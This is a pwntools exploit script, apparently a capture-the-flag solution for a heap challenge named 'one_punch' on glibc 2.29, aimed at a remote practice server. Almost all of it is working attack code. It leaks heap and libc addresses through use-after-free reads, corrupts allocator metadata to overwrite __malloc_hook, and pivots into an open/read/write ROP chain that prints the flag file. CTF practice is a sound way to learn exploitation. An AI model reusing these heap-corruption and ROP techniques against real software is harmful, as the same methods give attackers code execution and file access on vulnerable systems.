from pwn import *
context.log_level = 'debug'
prog = './one_punch'
elf = ELF(prog)
#p = process(prog)
libc = ELF("./libc-2.29.so")
p = remote("node3.buuoj.cn", 27100)
def debug(addr,PIE=True): 
	if PIE: 
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
		gdb.attach(p,'b *{}'.format(hex(text_base+addr))) 
	else: gdb.attach(p,"b *{}".format(hex(addr)))
def dbg():
    gdb.attach(p)
    p.interactive()

def add(idx, content):
	p.sendlineafter("> ", '1')
	p.sendlineafter("idx: ", str(idx))
	p.sendlineafter("hero name: ", content)
def edit(idx, content):
	p.sendlineafter("> ", '2')
	p.sendlineafter("idx: ", str(idx))
	p.sendlineafter("hero name: ", content)
def free(idx):
	p.sendlineafter("> ", '4')
	p.sendlineafter("idx: ", str(idx))
def show(idx):
	p.sendlineafter("> ", '3')
	p.sendlineafter("idx: ", str(idx))
def rop(pay):
	p.sendlineafter("> ", '50056')
	sleep(0.1)
	p.sendline(pay)
def exp():
	for i in range(7):
		add(0, 'a'*0x200)
		free(0)
	show(0)
	p.recvuntil("name: ")
	heap = u64(p.recv(6)+'\x00'*2)-0xcb0
	log.info("heap == >" + hex(heap))
	for i in range(6):
		add(0, 'a'*0xf0)
		free(0)

	add(0,'a'*0x200)
	add(1,'a'*0x200)
	add(1, 'a'*0x200)
	free(0)
	show(0)
	p.recvuntil("name: ")
	libc.address = u64(p.recv(6)+'\x00'*2)-0x7fa15ce80ca0+0x7fa15cc9c000
	log.info("libc.address == >" + hex(libc.address))
	add(0, 'a'*0x100)
	add(0, 'a'*0x300)
	free(1)
	add(0, 'a'*0x100)
	add(0, 'a'*0x300)
	edit(1, 'a'*0x100+p64(0)+p64(0x101)+p64(heap+6096)+p64(heap+0x20-5))

	
	add(0, 'a'*0x217)
	add(1, 'a'*0x280)
	free(0)
	add(1, './flag\x00\x00'+'a'*0xe8)
	edit(0, p64(libc.sym['__malloc_hook']))
	add_rsp = libc.address + 0x8cfd6
	rop('a')
	rop(p64(add_rsp))
	log.info("rsp ==> "+hex(add_rsp))
	#debug(0x139c)
	rax = libc.address + 0x47cf8
	rdi = libc.address + 0x26542
	rsi = libc.address + 0x26f9e
	rdx = libc.address + 0x12bda6
	
	syscall = libc.sym['syscall']+23
	pay = p64(rdi)+p64(heap+6112)
	pay += p64(rsi)+p64(0)
	pay += p64(rdx)+p64(0)
	pay += p64(rax)+p64(2)
	pay += p64(syscall)
	
	
	pay += p64(rdi)+p64(3)
	pay += p64(rsi)+p64(heap+6112)
	pay += p64(rdx)+p64(0x50)
	pay += p64(rax)+p64(0)
	pay += p64(syscall)
	

	pay += p64(rdi)+p64(1)
	pay += p64(rsi)+p64(heap+6112)
	pay += p64(rdx)+p64(0x50)
	pay += p64(rax)+p64(1)
	pay += p64(syscall)

	add(0, pay)
	p.interactive()
if __name__ == '__main__':	
	exp()
